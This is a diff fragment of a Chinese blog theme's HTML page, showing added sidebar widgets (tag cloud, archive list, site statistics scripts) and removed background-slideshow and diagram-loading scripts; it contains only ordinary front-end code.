href="/tags/%E4%BF%9D%E5%AF%86%E5%B7%A5%E4%BD%9C/" style="font-size: 14px; color: #999">保密工作</a> <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" style="font-size: 22.75px; color: #5e5e5e">内存马</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 24px; color: #555">春秋云镜</a> <a href="/tags/%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/" style="font-size: 14px; color: #999">栈帧逃逸</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 14px; color: #999">渗透</a> <a href="/tags/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" style="font-size: 15.25px; color: #919191">渗透笔记</a> <a href="/tags/%E6%BA%AF%E6%BA%90/" style="font-size: 14px; color: #999">溯源</a> <a href="/tags/%E7%B1%BB%E5%8A%A0%E8%BD%BD/" style="font-size: 15.25px; color: #919191">类加载</a>
+    </div>
+</section>
+
+  
+      
       
   <section class="widget side_recent_post">
     
@@ -1214,163 +1667,144 @@
     </div>
   </section>
 
+      
+  <section class="widget side_archives">
+    
+    <header><a style="color: red" href='/archives/'><i class="fas fa-archive fa-fw" aria-hidden="true"></i><span class='name'>归档</span></a></header><div class="content"><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/12/"><span class="card-archive-list-date">十二月 2025</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/11/"><span class="card-archive-list-date">十一月 2025</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/10/"><span class="card-archive-list-date">十月 2025</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/09/"><span class="card-archive-list-date">九月 2025</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">八月 2025</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">七月 2025</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">六月 2025</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><span class="card-archive-list-count">5</span></a></li></ul></div>
+  </section>
+
+      <section class="widget side_webinfo">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-chart-line fa-fw" aria-hidden="true"></i><span class='name' style="color: ">站点信息</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="webinfo">
+      
+        <div class="webinfo-item">
+          <div>文章数目：</div>
+          <div>121 篇</div>
+        </div>
+      
+
+      
+        <div class="webinfo-item">
+          <div>已运行时间：</div>
+          <div id="webinfo-runtime-count" publish_date="03/24/2020 21:34:09"></div>
+        </div>
+        <script>
+          var BirthDay = new Date(new Date('2020/03/15'));
+          var today = new Date();
+          var timeold = (today.getTime() - BirthDay.getTime());
+          var daysold = Math.floor(timeold / (24 * 60 * 60 * 1000));
+          document.getElementById('webinfo-runtime-count').innerHTML = daysold + ' 天';
+        </script>
+      
+
+
+      
+        <div class="webinfo-item">
+          <div>本站总字数：</div>
+          <div>430.8k 字</div>
+        </div>
+      
+
+      
+        <div class="webinfo-item">
+          <div>本站访客数：</div>
+          
+          <div><span id="busuanzi_value_site_uv"><i class="fas fa-fan fa-spin fa-fw" aria-hidden="true"></i></span> 人</div>
+          
+        </div>
+      
+
+      
+        <div class="webinfo-item">
+          <div>本站总访问量：</div>
+          
+          <div><span id="busuanzi_value_site_pv"><i class="fas fa-fan fa-spin fa-fw" aria-hidden="true"></i></span> 次</div>
+          
+        </div>
+      
+
+      
+        <div class="webinfo-item">
+          <div>最后活动时间：</div>
+          
+            <div id="last-update" style="display: none;">Mon Dec 29 2025 13:29:14 GMT+0800 (中国标准时间)</div>
+            <div id="last-update-show">2025-12-29 日</div>
+          
+        </div>
+        
+        <script>
+          function timeago(dateTimeStamp) {
+              var minute = 1000 * 60; //把分，时，天，周，半个月，一个月用毫秒表示
+              var hour = minute * 60;
+              var day = hour * 24;
+              var week = day * 7;
+              var month = day * 30;
+              var now = new Date().getTime(); //获取当前时间毫秒
+              var diffValue = now - dateTimeStamp; //时间差
+              if (diffValue < 0) {
+                  return;
+              }
+              var minC = diffValue / minute; //计算时间差的分，时，天，周，月
+              var hourC = diffValue / hour;
+              var dayC = diffValue / day;
+              var weekC = diffValue / week;
+              var monthC = diffValue / month;
+              if (monthC >= 1 && monthC <= 3) {
+                  result = " " + parseInt(monthC) + " 月前"
+              } else if (weekC >= 1 && weekC <= 3) {
+                  result = " " + parseInt(weekC) + " 周前"
+              } else if (dayC >= 1 && dayC <= 6) {
+                  result = " " + parseInt(dayC) + " 天前"
+              } else if (hourC >= 1 && hourC <= 23) {
+                  result = " " + parseInt(hourC) + " 小时前"
+              } else if (minC >= 1 && minC <= 59) {
+                  result = " " + parseInt(minC) + " 分钟前"
+              } else if (diffValue >= 0 && diffValue <= minute) {
+                  result = "刚刚"
+              } else {
+                  var datetime = new Date();
+                  datetime.setTime(dateTimeStamp);
+                  var Nyear = datetime.getFullYear();
+                  var Nmonth = datetime.getMonth() + 1 < 10 ? "0" + (datetime.getMonth() + 1) : datetime.getMonth() + 1;
+                  var Ndate = datetime.getDate() < 10 ? "0" + datetime.getDate() : datetime.getDate();
+                  var Nhour = datetime.getHours() < 10 ? "0" + datetime.getHours() : datetime.getHours();
+                  var Nminute = datetime.getMinutes() < 10 ? "0" + datetime.getMinutes() : datetime.getMinutes();
+                  var Nsecond = datetime.getSeconds() < 10 ? "0" + datetime.getSeconds() : datetime.getSeconds();
+                  result = Nyear + "-" + Nmonth + "-" + Ndate
+              }
+              return result;
+          }
+          var lastUpDate = document.getElementById('last-update').innerHTML;
+          try {
+            document.getElementById('last-update-show').innerHTML = timeago(new Date(lastUpDate));
+          } catch (error) {
+            document.getElementById('last-update-show').innerHTML = '2025-12-29 日';
+          }
+        </script>
+        
+      
+    </div>
+  </div>
+</section>
+      
     
   </div>
 </aside>
-
-  <!-- 图片放大 Wrap images with fancybox support -->
-  <script src="/js/wrapImage.js"></script>
 </div>
-
-<!-- 文章详情页背景图 -->
-<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
-	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
-	<transition-group tag="ul" :name="names">
-		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
-			<img :src="image" class="bg-swiper-img no-lazy">
-		</li>
-	</transition-group>
-</div>
-<script>
-	var vm = new Vue({
-		el: '#appBgSwiper',
-		data: {
-			names: '' || 'fade' || 'fade', // translate-fade fade
-			mark: 0,
-			img: [],
-			bgColor: '',
-			time: null
-		},
-		methods: {   //添加方法
-			change(i, m) {
-				if (i > m) {
-					// this.names = 'fade';
-				} else if (i < m) {
-					// this.names = 'fade';
-				} else {
-					return;
-				}
-				this.mark = i;
-			},
-			prev() {
-				// this.names = 'fade';
-				this.mark--;
-				if (this.mark === -1) {
-					this.mark = 3;
-					return
-				}
-			},
-			next() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			autoPlay() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			play() {
-				let bgImgDelay = '' || '180000'
-				let delay = parseInt(bgImgDelay) || 180000;
-				this.time = setInterval(this.autoPlay, delay);
-			},
-			enter() {
-				clearInterval(this.time);
-			},
-			leave() {
-				this.play();
-			}
-		},
-		created() {
-			this.play()
-		},
-		beforeDestroy() {
-			clearInterval(this.time);
-		},
-		mounted() {
-			let prop = '' || '';
-			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
-			if (isImg) {
-				let img = prop.split(',');
-				let configRoot = '/'
-				let arrImg = [];
-				img.forEach(el => {
-					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
-					var objExp = new RegExp(Expression);
-
-					if (objExp.test(el)) {
-						// http or https
-						arrImg.push(el);
-					} else {
-						// 非http or https开头
-						// 本地文件
-						let firstStr = el.charAt(0);
-						if (firstStr == '/') {
-							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
-						}
-						el = configRoot + el;
-						arrImg.push(el);
-					}
-				})
-				this.img = arrImg;
-			} else {
-				this.bgColor = prop;
-			}
-		}
-	})
-</script>
-
-<style>
-	.bg-swiper-box {
-		position: absolute;
-		display: block;
-		width: 100%;
-		height: 100%;
-	}
-
-	.bg-swiper-img {
-		object-fit: cover;
-		width: 100%;
-		height: 100%;
-	}
-</style>
+<!-- 花瓣和雪花飘落 -->
+<!-- 雪花和花瓣特效 -->
 
 
 
-
-  <script>
-  function loadMermaid() {
-    if (document.getElementsByClassName('mermaid').length) {
-      if (window.mermaidJsLoad) mermaid.init()
-      else {
-        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
-          window.mermaidJsLoad = true
-          mermaid.initialize({
-            theme: 'default',
-          })
-          if ('true') {
-            mermaid.init();
-          }
-        })
-      }
-    }
-  };
-  document.addEventListener("DOMContentLoaded", function () {
-    loadMermaid();
-  })
-
-  document.addEventListener('pjax:complete', function () {
-    loadMermaid();
-  })
-  
-</script>
+<!-- 灯笼 -->
 
 
       </main>
